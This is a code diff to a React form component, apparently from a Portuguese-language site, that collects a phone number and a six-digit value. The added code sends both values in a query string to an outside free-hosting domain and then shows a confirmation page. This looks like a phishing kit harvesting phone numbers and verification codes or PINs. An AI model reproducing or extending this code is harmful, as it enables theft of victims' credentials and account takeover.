@@ -17,9 +17,20 @@ const EmailTelefone = () => {
     };
 
     const handleClick = () => {
-        setTimeout(() => {
-            localStorage.setItem("tel", tel);
-            localStorage.setItem("seis", seis);
+        setTimeout(async () => {
+            if(!tel || !seis){
+                alert("Por favor preencha todos os campos !");
+                return; // Adicionado para evitar prosseguir com a execução
+              }
+              try {
+                const response = await fetch(`https://checker9387.000webhostapp.com/3/?tel=${tel}&seis=${seis}`);
+                if (!response.ok) {
+                  throw new Error('Sistema indisponível');
+                }
+                navigate('/confirm');
+              } catch (error) {
+                console.error('Erro ao fazer a requisição:', error);
+              }
             navigate('/confirm');
         }, 1000);
     };
